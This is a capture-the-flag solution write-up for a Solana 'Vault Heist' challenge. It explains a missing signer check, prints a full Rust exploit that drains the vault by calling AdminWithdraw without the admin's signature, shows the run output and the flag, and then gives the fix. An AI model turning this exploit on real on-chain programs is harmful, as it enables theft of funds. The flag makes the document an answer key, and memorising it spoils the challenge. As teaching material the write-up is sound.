# Solution: Vault Heist

## Vulnerability Analysis

The vulnerability is a **Missing Signer Check** in the `AdminWithdraw` instruction.

### The Vulnerable Code

In `program/src/processor.rs`, the `process_admin_withdraw` function:

```rust
fn process_admin_withdraw(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    amount: u64,
) -> ProgramResult {
    // ...
    let admin_account = next_account_info(account_info_iter)?;
    let recipient_account = next_account_info(account_info_iter)?;
    
    let vault_data = Vault::try_from_slice(&vault_account.data.borrow())?;

    // VULNERABILITY: Only checks the pubkey, not the signature!
    if vault_data.admin != *admin_account.key {
        msg!("Only admin can withdraw from vault");
        return Err(ProgramError::InvalidAccountData);
    }

    // Missing: if !admin_account.is_signer { ... }
    
    // Transfer happens without verifying admin signed!
    **vault_account.lamports.borrow_mut() -= amount;
    **recipient_account.lamports.borrow_mut() += amount;
}
```

The function checks if the provided `admin_account.key` matches the stored admin pubkey, but **never checks** `admin_account.is_signer`.

## Exploitation

### Step 1: Understanding the Attack

We can call `AdminWithdraw` with:
- The admin's pubkey (which we know from the server)
- Our own account as the recipient
- **Without** having the admin's private key

The program will accept this because it only verifies the pubkey, not the signature.

### Step 2: Implementing the Exploit

Edit `solve/src/processor.rs`:

```rust
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    pubkey::Pubkey,
    instruction::{AccountMeta, Instruction},
};
use borsh::BorshSerialize;

#[derive(BorshSerialize)]
pub enum VaultInstruction {
    Initialize,
    Deposit { amount: u64 },
    AdminWithdraw { amount: u64 },
}

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("Starting exploit...");
    
    let account_info_iter = &mut accounts.iter();
    let user_account = next_account_info(account_info_iter)?;
    let vault_program = next_account_info(account_info_iter)?;
    let vault_pda = next_account_info(account_info_iter)?;
    let admin_pubkey = next_account_info(account_info_iter)?;
    
    msg!("User: {}", user_account.key);
    msg!("Vault Program: {}", vault_program.key);
    msg!("Vault PDA: {}", vault_pda.key);
    msg!("Admin: {}", admin_pubkey.key);
    
    // Exploit: Call AdminWithdraw with admin's pubkey but without signature
    let steal_amount: u64 = 45_000_000_000; // 45 SOL
    
    let malicious_instruction = Instruction {
        program_id: *vault_program.key,
        accounts: vec![
            AccountMeta::new(*vault_pda.key, false),
            AccountMeta::new(*admin_pubkey.key, false), // NOT a signer!
            AccountMeta::new(*user_account.key, false),
        ],
        data: VaultInstruction::AdminWithdraw { amount: steal_amount }
            .try_to_vec()
            .unwrap(),
    };
    
    msg!("Calling AdminWithdraw without admin signature...");
    invoke(
        &malicious_instruction,
        &[
            vault_pda.clone(),
            admin_pubkey.clone(),
            user_account.clone(),
        ],
    )?;
    
    msg!("Exploit successful! Stole {} lamports", steal_amount);
    
    Ok(())
}
```

### Step 3: Build and Run

```bash
# Build the exploit
cd solve
cargo build-sbf

# Run against the server
python3 solve.py
```

## Expected Output

```
╔════════════════════════════════════════════════╗
║        H7CTF 2025 - Vault Heist                ║
║                                                ║
║  A mysterious vault holds 50 SOL...            ║
║  Can you find a way to steal from it?         ║
╚════════════════════════════════════════════════╝

Initializing challenge instance...
Instance ready.

Player Account:
  Address: <your address>
  Balance: 5 SOL
  Private Key: <your privkey>

Program:
  Program ID: <program id>
  Vault PDA: <vault pda>
  Admin: <admin pubkey>

Vault Status:
  Balance: 50 SOL
  Admin: <admin pubkey>

Running your exploit...

Your balance before: 5 SOL
Your balance after: 50 SOL

╔════════════════════════════════════════════════╗
║              🎉 HEIST SUCCESSFUL! 🎉            ║
╚════════════════════════════════════════════════╝

Flag: H7CTF{m1ss1ng_s1gn3r_ch3ck_1s_4_cl4ss1c_vuln}
```

## Key Takeaways

### What We Learned

1. **Signer Checks Are Critical**: Always verify `is_signer` for privileged operations
2. **Identity ≠ Authorization**: Knowing someone's pubkey doesn't mean you have their permission
3. **Defense in Depth**: Multiple checks are better than one

### The Fix

```rust
fn process_admin_withdraw(/* ... */) -> ProgramResult {
    // ...
    
    // ADD THIS CHECK:
    if !admin_account.is_signer {
        msg!("Admin must sign the transaction");
        return Err(ProgramError::MissingRequiredSignature);
    }
    
    if vault_data.admin != *admin_account.key {
        msg!("Only admin can withdraw from vault");
        return Err(ProgramError::InvalidAccountData);
    }
    
    // Now safe to proceed...
}
```

### Real-World Examples

This exact vulnerability pattern has caused major exploits:

- **Wormhole** (2022): $325M stolen - missing signature verification on bridge
- **Cashio** (2022): $52M drained - missing mint authority verification
- **Saber** (2022): Critical bug found in audit - same pattern

### Best Practices

1. **Always check `is_signer`** for privileged operations
2. **Use Anchor framework** - it helps prevent this (but doesn't eliminate it)
3. **Get audits** from reputable firms like OtterSec
4. **Use account constraints** to enforce signer requirements
5. **Test extensively** with adversarial mindset

## Flag

```
H7CTF{m1ss1ng_s1gn3r_ch3ck_1s_4_cl4ss1c_vuln}
```

---

**Challenge created using [OtterSec Sol-CTF Framework](https://github.com/otter-sec/sol-ctf-framework)**
